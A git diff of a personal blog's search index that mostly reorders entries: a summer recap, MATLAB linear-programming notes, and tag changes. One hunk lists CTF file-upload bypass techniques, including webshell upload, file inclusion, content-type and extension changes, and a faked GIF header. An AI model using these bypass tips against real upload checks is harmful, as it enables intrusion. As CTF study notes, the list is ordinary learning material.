       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>暑假总结</title>
-    <url>/posts/123f4dc2/</url>
-    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
-<ul>
-<li><p>python入门到精通</p>
-</li>
-<li><p>数学建模学了一点点，matlab基本是会用了</p>
-</li>
-<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
-</li>
-<li><p>折腾服务器，搭建了私有云</p>
-</li>
-<li><p>linux 使用的更熟练了，包括docker了等等</p>
-</li>
-<li><p>学会了git使用外加GitHub，之前不是很会</p>
-</li>
-<li><p>洛克王国天梯打到了高级段位</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>线性规划与整数线性规划</title>
-    <url>/posts/dea132b6/</url>
-    <content><![CDATA[<h1 id="线性规划"><a href="#线性规划" class="headerlink" title="线性规划"></a>线性规划</h1><blockquote>
-<p>最近在学数学建模，把代码和遇到的问题记录一下</p>
-</blockquote>
-<h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>基本直接套函数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[x，fval]=linprog(f,A,b,Aeq,beq,lb,ub)</span><br></pre></td></tr></table></figure>
-<p>x返回决策向量取值，fval返回最优解，f目标函数，A,b线性不等式约束，Aeq,beq线性等式约束，lb,ub界值向量</p>
-<p>一般都是矩阵形式</p>
-<p>一个easy题，把代码复习一下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">max z=<span class="number">2</span>x1+<span class="number">3</span>x2<span class="number">-5</span>x3,</span><br><span class="line">s.t.</span><br><span class="line">x1+x2+x3=<span class="number">7</span>,</span><br><span class="line"><span class="number">2</span>x1<span class="number">-5</span>x2+x3&gt;=<span class="number">10</span>,</span><br><span class="line">x1+<span class="number">3</span>x2+x3&lt;=<span class="number">12</span>,</span><br><span class="line">x1,x2,x3&gt;=<span class="number">0</span></span><br></pre></td></tr></table></figure>
-<p>程序如下</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">f=[-<span class="number">2</span>;-<span class="number">3</span>;-<span class="number">5</span>];</span><br><span class="line">a=[-<span class="number">2</span> <span class="number">5</span> -<span class="number">1</span>;<span class="number">1</span> <span class="number">3</span> <span class="number">1</span>];</span><br><span class="line">b=[-<span class="number">10</span>;<span class="number">12</span>];</span><br><span class="line">aeq=ones(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">beq=<span class="number">7</span>;</span><br><span class="line">[x,y]=linprog(f,a,b,aeq,beq,zeros(<span class="number">3</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
-<h2 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h2><p>即带绝对值的，也挺简单的，改一下模型就行，用lingo可以直接求</p>
-<h2 id="一类问题"><a href="#一类问题" class="headerlink" title="一类问题"></a>一类问题</h2><p>主要就是投资的收益和风险，具体问题具体分析，大部分可以简化模型，比如固定一个值，优化另一个，再用循环改变固定值</p>
-<h1 id="整数规划"><a href="#整数规划" class="headerlink" title="整数规划"></a>整数规划</h1><h2 id="0-1型整数规划"><a href="#0-1型整数规划" class="headerlink" title="0-1型整数规划"></a>0-1型整数规划</h2><h3 id="相互排斥"><a href="#相互排斥" class="headerlink" title="相互排斥"></a>相互排斥</h3><p>改写约束条件，比如</p>
-<p>x=0或500&lt;x&lt;800</p>
-<p>改写为 500y&lt;x&lt;800y,y=0或1</p>
-<p>思路比较灵活，有时候需要引入M(充分大)</p>
-<h3 id="指派问题"><a href="#指派问题" class="headerlink" title="指派问题"></a>指派问题</h3><p>直接用intlinprog,比linprog多了个参数intcon,还是比较复杂的，需要把多维变量转变成一维向量</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">clc,clear</span><br><span class="line">c=[<span class="number">3</span> <span class="number">8</span> <span class="number">2</span> <span class="number">10</span> <span class="number">3</span>;</span><br><span class="line">   <span class="number">8</span> <span class="number">7</span> <span class="number">2</span> <span class="number">9</span> <span class="number">7</span>;</span><br><span class="line">   <span class="number">6</span> <span class="number">4</span> <span class="number">2</span> <span class="number">7</span> <span class="number">5</span>;</span><br><span class="line">   <span class="number">8</span> <span class="number">4</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span>;</span><br><span class="line">   <span class="number">9</span> <span class="number">10</span> <span class="number">6</span> <span class="number">9</span> <span class="number">10</span>;]; <span class="comment">//系数矩阵</span></span><br><span class="line">c=reshape(c,[<span class="number">25</span> <span class="number">1</span>]);</span><br><span class="line">a=zeros(<span class="number">10</span>,<span class="number">25</span>);</span><br><span class="line">intcon=<span class="number">1</span>:<span class="number">25</span>;</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>:<span class="number">5</span></span><br><span class="line">    a(i,(i<span class="number">-1</span>)*<span class="number">5</span>+<span class="number">1</span>:<span class="number">5</span>*i)=<span class="number">1</span>;</span><br><span class="line">    a(<span class="number">5</span>+i,i:<span class="number">5</span>:<span class="number">25</span>)=<span class="number">1</span>;</span><br><span class="line">end</span><br><span class="line">b=ones(<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line">lb=zeros(<span class="number">25</span>,<span class="number">1</span>);</span><br><span class="line">ub=ones(<span class="number">25</span>,<span class="number">1</span>);</span><br><span class="line">x=intlinprog(c,intcon,[],[],a,b,lb,ub);</span><br><span class="line">x=reshape(x,[<span class="number">5</span> <span class="number">5</span>])</span><br></pre></td></tr></table></figure>
-
-<h2 id="蒙特卡洛法"><a href="#蒙特卡洛法" class="headerlink" title="蒙特卡洛法"></a>蒙特卡洛法</h2><p>很经典的随机模拟方法，直接上代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mengte.m函数文件</span><br><span class="line">function[f,g]=mengte(x)</span><br><span class="line">f=x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>+<span class="number">3</span>*x(<span class="number">3</span>)^<span class="number">2</span>+<span class="number">4</span>*x(<span class="number">4</span>)^<span class="number">2</span>+<span class="number">2</span>*x(<span class="number">5</span>)^<span class="number">2</span><span class="number">-8</span>*x(<span class="number">1</span>)<span class="number">-2</span>*x(<span class="number">2</span>)<span class="number">-3</span>*x(<span class="number">3</span>)-x(<span class="number">4</span>)<span class="number">-2</span>*x(<span class="number">5</span>);</span><br><span class="line">g=[sum(x)<span class="number">-400</span></span><br><span class="line">    x(<span class="number">1</span>)+<span class="number">2</span>*x(<span class="number">2</span>)+<span class="number">2</span>*x(<span class="number">3</span>)+x(<span class="number">4</span>)+<span class="number">6</span>*x(<span class="number">5</span>)<span class="number">-800</span></span><br><span class="line">    <span class="number">2</span>*x(<span class="number">1</span>)+x(<span class="number">2</span>)+<span class="number">6</span>*x(<span class="number">3</span>)<span class="number">-200</span></span><br><span class="line">    x(<span class="number">3</span>)+x(<span class="number">4</span>)+<span class="number">5</span>*x(<span class="number">5</span>)<span class="number">-200</span>];</span><br></pre></td></tr></table></figure>
-
-<p>测试代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rng(sum(clock));</span><br><span class="line">p0=<span class="number">0</span>;</span><br><span class="line">tic</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>:<span class="number">10</span>^<span class="number">6</span></span><br><span class="line">    x=randi([<span class="number">0</span>,<span class="number">99</span>],<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">    [f,g]=mengte(x);</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">all</span><span class="params">(g&lt;=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">if</span> p0&lt;f</span></span><br><span class="line"><span class="function">            x0</span>=x;p0=f;</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">x0,p0</span><br><span class="line">toc</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>暂时写这么多，碰到问题再补充</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>数学建模</category>
-      </categories>
-      <tags>
-        <tag>matlab</tag>
-        <tag>数学建模</tag>
       </tags>
   </entry>
   <entry>
@@ -1859,9 +1793,9 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <li>上传包含一句话文件/日志包含/远程文件包含</li>
 <li>绕过关键字过滤</li>
 <li>绕过特殊类型如二次渲染/httpd</li>
-<li>session竞争<h2 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h2></li>
+<li>session竞争</li>
 </ol>
-<p>直接改前端代码即可</p>
+<h2 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h2><p>直接改前端代码即可</p>
 <h2 id="简单后端过滤"><a href="#简单后端过滤" class="headerlink" title="简单后端过滤"></a>简单后端过滤</h2><p>content-type 改为 image/png(jpg/gif)</p>
 <p>filename 改后缀</p>
 <p>改文件头为gif头</p>
@@ -1930,6 +1864,31 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
+    <title>暑假总结</title>
+    <url>/posts/123f4dc2/</url>
+    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
+<ul>
+<li><p>python入门到精通</p>
+</li>
+<li><p>数学建模学了一点点，matlab基本是会用了</p>
+</li>
+<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
+</li>
+<li><p>折腾服务器，搭建了私有云</p>
+</li>
+<li><p>linux 使用的更熟练了，包括docker了等等</p>
+</li>
+<li><p>学会了git使用外加GitHub，之前不是很会</p>
+</li>
+<li><p>洛克王国天梯打到了高级段位</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>爬取冰冰vlog.001评论&amp;&amp;做词云</title>
     <url>/posts/6d65a59f/</url>
     <content><![CDATA[<blockquote>
@@ -1963,6 +1922,47 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </categories>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>线性规划与整数线性规划</title>
+    <url>/posts/dea132b6/</url>
+    <content><![CDATA[<h1 id="线性规划"><a href="#线性规划" class="headerlink" title="线性规划"></a>线性规划</h1><blockquote>
+<p>最近在学数学建模，把代码和遇到的问题记录一下</p>
+</blockquote>
+<h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>基本直接套函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[x，fval]=linprog(f,A,b,Aeq,beq,lb,ub)</span><br></pre></td></tr></table></figure>
+<p>x返回决策向量取值，fval返回最优解，f目标函数，A,b线性不等式约束，Aeq,beq线性等式约束，lb,ub界值向量</p>
+<p>一般都是矩阵形式</p>
+<p>一个easy题，把代码复习一下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">max z=<span class="number">2</span>x1+<span class="number">3</span>x2<span class="number">-5</span>x3,</span><br><span class="line">s.t.</span><br><span class="line">x1+x2+x3=<span class="number">7</span>,</span><br><span class="line"><span class="number">2</span>x1<span class="number">-5</span>x2+x3&gt;=<span class="number">10</span>,</span><br><span class="line">x1+<span class="number">3</span>x2+x3&lt;=<span class="number">12</span>,</span><br><span class="line">x1,x2,x3&gt;=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>程序如下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">f=[-<span class="number">2</span>;-<span class="number">3</span>;-<span class="number">5</span>];</span><br><span class="line">a=[-<span class="number">2</span> <span class="number">5</span> -<span class="number">1</span>;<span class="number">1</span> <span class="number">3</span> <span class="number">1</span>];</span><br><span class="line">b=[-<span class="number">10</span>;<span class="number">12</span>];</span><br><span class="line">aeq=ones(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">beq=<span class="number">7</span>;</span><br><span class="line">[x,y]=linprog(f,a,b,aeq,beq,zeros(<span class="number">3</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+<h2 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h2><p>即带绝对值的，也挺简单的，改一下模型就行，用lingo可以直接求</p>
+<h2 id="一类问题"><a href="#一类问题" class="headerlink" title="一类问题"></a>一类问题</h2><p>主要就是投资的收益和风险，具体问题具体分析，大部分可以简化模型，比如固定一个值，优化另一个，再用循环改变固定值</p>
+<h1 id="整数规划"><a href="#整数规划" class="headerlink" title="整数规划"></a>整数规划</h1><h2 id="0-1型整数规划"><a href="#0-1型整数规划" class="headerlink" title="0-1型整数规划"></a>0-1型整数规划</h2><h3 id="相互排斥"><a href="#相互排斥" class="headerlink" title="相互排斥"></a>相互排斥</h3><p>改写约束条件，比如</p>
+<p>x=0或500&lt;x&lt;800</p>
+<p>改写为 500y&lt;x&lt;800y,y=0或1</p>
+<p>思路比较灵活，有时候需要引入M(充分大)</p>
+<h3 id="指派问题"><a href="#指派问题" class="headerlink" title="指派问题"></a>指派问题</h3><p>直接用intlinprog,比linprog多了个参数intcon,还是比较复杂的，需要把多维变量转变成一维向量</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">clc,clear</span><br><span class="line">c=[<span class="number">3</span> <span class="number">8</span> <span class="number">2</span> <span class="number">10</span> <span class="number">3</span>;</span><br><span class="line">   <span class="number">8</span> <span class="number">7</span> <span class="number">2</span> <span class="number">9</span> <span class="number">7</span>;</span><br><span class="line">   <span class="number">6</span> <span class="number">4</span> <span class="number">2</span> <span class="number">7</span> <span class="number">5</span>;</span><br><span class="line">   <span class="number">8</span> <span class="number">4</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span>;</span><br><span class="line">   <span class="number">9</span> <span class="number">10</span> <span class="number">6</span> <span class="number">9</span> <span class="number">10</span>;]; <span class="comment">//系数矩阵</span></span><br><span class="line">c=reshape(c,[<span class="number">25</span> <span class="number">1</span>]);</span><br><span class="line">a=zeros(<span class="number">10</span>,<span class="number">25</span>);</span><br><span class="line">intcon=<span class="number">1</span>:<span class="number">25</span>;</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>:<span class="number">5</span></span><br><span class="line">    a(i,(i<span class="number">-1</span>)*<span class="number">5</span>+<span class="number">1</span>:<span class="number">5</span>*i)=<span class="number">1</span>;</span><br><span class="line">    a(<span class="number">5</span>+i,i:<span class="number">5</span>:<span class="number">25</span>)=<span class="number">1</span>;</span><br><span class="line">end</span><br><span class="line">b=ones(<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line">lb=zeros(<span class="number">25</span>,<span class="number">1</span>);</span><br><span class="line">ub=ones(<span class="number">25</span>,<span class="number">1</span>);</span><br><span class="line">x=intlinprog(c,intcon,[],[],a,b,lb,ub);</span><br><span class="line">x=reshape(x,[<span class="number">5</span> <span class="number">5</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="蒙特卡洛法"><a href="#蒙特卡洛法" class="headerlink" title="蒙特卡洛法"></a>蒙特卡洛法</h2><p>很经典的随机模拟方法，直接上代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mengte.m函数文件</span><br><span class="line">function[f,g]=mengte(x)</span><br><span class="line">f=x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>+<span class="number">3</span>*x(<span class="number">3</span>)^<span class="number">2</span>+<span class="number">4</span>*x(<span class="number">4</span>)^<span class="number">2</span>+<span class="number">2</span>*x(<span class="number">5</span>)^<span class="number">2</span><span class="number">-8</span>*x(<span class="number">1</span>)<span class="number">-2</span>*x(<span class="number">2</span>)<span class="number">-3</span>*x(<span class="number">3</span>)-x(<span class="number">4</span>)<span class="number">-2</span>*x(<span class="number">5</span>);</span><br><span class="line">g=[sum(x)<span class="number">-400</span></span><br><span class="line">    x(<span class="number">1</span>)+<span class="number">2</span>*x(<span class="number">2</span>)+<span class="number">2</span>*x(<span class="number">3</span>)+x(<span class="number">4</span>)+<span class="number">6</span>*x(<span class="number">5</span>)<span class="number">-800</span></span><br><span class="line">    <span class="number">2</span>*x(<span class="number">1</span>)+x(<span class="number">2</span>)+<span class="number">6</span>*x(<span class="number">3</span>)<span class="number">-200</span></span><br><span class="line">    x(<span class="number">3</span>)+x(<span class="number">4</span>)+<span class="number">5</span>*x(<span class="number">5</span>)<span class="number">-200</span>];</span><br></pre></td></tr></table></figure>
+
+<p>测试代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rng(sum(clock));</span><br><span class="line">p0=<span class="number">0</span>;</span><br><span class="line">tic</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>:<span class="number">10</span>^<span class="number">6</span></span><br><span class="line">    x=randi([<span class="number">0</span>,<span class="number">99</span>],<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">    [f,g]=mengte(x);</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">all</span><span class="params">(g&lt;=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">if</span> p0&lt;f</span></span><br><span class="line"><span class="function">            x0</span>=x;p0=f;</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">x0,p0</span><br><span class="line">toc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>暂时写这么多，碰到问题再补充</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>数学建模</category>
+      </categories>
+      <tags>
+        <tag>matlab</tag>
+        <tag>数学建模</tag>
       </tags>
   </entry>
   <entry>
@@ -2637,8 +2637,8 @@ const USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
